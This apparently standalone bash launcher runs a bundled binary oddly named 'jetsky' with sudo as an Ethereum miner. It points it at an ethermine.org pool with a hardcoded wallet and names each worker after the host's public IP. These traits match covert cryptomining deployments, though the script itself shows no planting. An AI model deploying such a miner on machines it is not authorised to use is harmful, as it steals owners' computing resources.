#!/bin/bash

WALLET=0xf339db86fafc99f85619a0d55e2d1e47ef9a840a
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-eth

cd "$(dirname "$0")"

chmod +x ./jetsky && sudo ./jetsky -G -P stratum1+tcp://$WALLET.$WORKER@asia1.ethermine.org:4444
